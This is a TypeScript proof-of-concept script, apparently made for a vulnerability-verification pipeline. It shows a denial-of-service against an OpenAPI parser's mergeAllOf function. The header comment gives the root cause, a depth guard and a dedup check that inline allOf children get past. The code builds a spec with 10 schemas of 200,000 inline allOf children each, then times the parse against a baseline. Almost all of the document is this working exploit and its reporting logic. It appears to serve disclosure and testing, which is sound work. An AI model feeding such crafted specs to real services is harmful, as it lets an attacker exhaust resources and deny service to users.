/**
 * PoC M4 — allOf breadth DoS: depth guard (MAX_DEREF_DEPTH) bypass
 *
 * Root-cause: mergeAllOf() at src/services/OpenAPIParser.ts:199 iterates
 * schema.allOf with no breadth limit. MAX_DEREF_DEPTH=999 at :108 only
 * checks baseRefsStack.length; inline schemas push nothing onto the stack,
 * so the guard can never fire. uniqByPropIncludeMissing at :393 lets every
 * inline child through because k=item['$ref']=undefined => "if (!k) return true".
 *
 * Scenario: crafted spec with 10 schemas each carrying 200,000 inline allOf
 * children. No $ref used — pure inline schemas at depth 1 only.
 *
 * Expected: 10×200k = 2,000,000 mergeAllOf iterations; measurable wall-clock
 * delay in Node.js (600ms+); proportionally worse in browser JS engines.
 *
 * Usage (from repo root):
 *   npx ts-node --project tsconfig.json --transpile-only poc_m4_runner.ts
 */

import { OpenAPIParser } from './src/services/OpenAPIParser';
import { AcmeNormalizedOptions } from './src/services/AcmeNormalizedOptions';

const opts = new AcmeNormalizedOptions({});

/* ---------- helpers ------------------------------------------------------- */

function buildSpec(nSchemas: number, childrenEach: number): any {
  const schemas: Record<string, any> = {};
  for (let s = 0; s < nSchemas; s++) {
    schemas[`Bomb${s}`] = {
      allOf: Array.from({ length: childrenEach }, (_, i) => ({
        type: 'string',
        maxLength: i + 1,
        minLength: s,
      })),
    };
  }
  return {
    openapi: '3.0.0',
    info: { title: 'PoC-M4', version: '0.0.1' },
    paths: {},
    components: { schemas },
  };
}

function runParse(spec: any, nSchemas: number): { ms: number; depthGuardFired: boolean } {
  const parser = new OpenAPIParser(spec, undefined, opts);
  let depthGuardFired = false;
  const t0 = Date.now();
  for (let s = 0; s < nSchemas; s++) {
    const merged = parser.mergeAllOf(
      spec.components.schemas[`Bomb${s}`],
      `#/components/schemas/Bomb${s}`,
      [],
    );
    if (merged['x-circular-ref']) depthGuardFired = true;
  }
  return { ms: Date.now() - t0, depthGuardFired };
}

/* ---------- measurements -------------------------------------------------- */

const N_SCHEMAS     = 10;
const BASELINE_N    = 1;  // 1 child each schema = minimal work
const ATTACK_N      = 200_000; // 200k children each schema

// Warm-up
runParse(buildSpec(N_SCHEMAS, BASELINE_N), N_SCHEMAS);

console.log(`[*] Baseline : ${N_SCHEMAS} schemas × ${BASELINE_N} allOf child`);
const baseline = runParse(buildSpec(N_SCHEMAS, BASELINE_N), N_SCHEMAS);
console.log(`    => ${baseline.ms} ms  (depth guard fired: ${baseline.depthGuardFired})`);

console.log(`[*] Malicious: ${N_SCHEMAS} schemas × ${ATTACK_N.toLocaleString()} inline allOf children`);
const attack = runParse(buildSpec(N_SCHEMAS, ATTACK_N), N_SCHEMAS);
console.log(`    => ${attack.ms} ms  (depth guard fired: ${attack.depthGuardFired})`);

const totalOps = N_SCHEMAS * ATTACK_N;
console.log(`[*] Total mergeAllOf iterations (attack): ${totalOps.toLocaleString()}`);
console.log(`[*] Depth guard bypassed: ${!attack.depthGuardFired} — inline schemas never push onto refsStack`);
console.log(`[*] uniqByPropIncludeMissing bypass: k=undefined ("if (!k) return true") — all ${ATTACK_N.toLocaleString()} children pass dedup`);

const ratioStr = baseline.ms > 0
  ? `${(attack.ms / baseline.ms).toFixed(0)}x`
  : `${attack.ms}ms absolute (baseline < 1ms — sub-millisecond)`;
console.log(`[*] Slowdown: ${ratioStr}`);

// Confirm if we got measurable delay and guard did NOT fire
const confirmed = attack.ms >= 100 && !attack.depthGuardFired;
const status = confirmed ? 'confirmed' : 'inconclusive';
const evidence = confirmed
  ? `${N_SCHEMAS} schemas × ${ATTACK_N} inline allOf children took ${attack.ms}ms (baseline ${baseline.ms}ms); depth guard x-circular-ref=false — bypassed`
  : `attack=${attack.ms}ms baseline=${baseline.ms}ms depth_guard_fired=${attack.depthGuardFired}`;

// MUST be last stdout line — poc-runner JSON contract
console.log(JSON.stringify({ status, evidence, notes: `total_ops=${totalOps} slowdown=${ratioStr}` }));
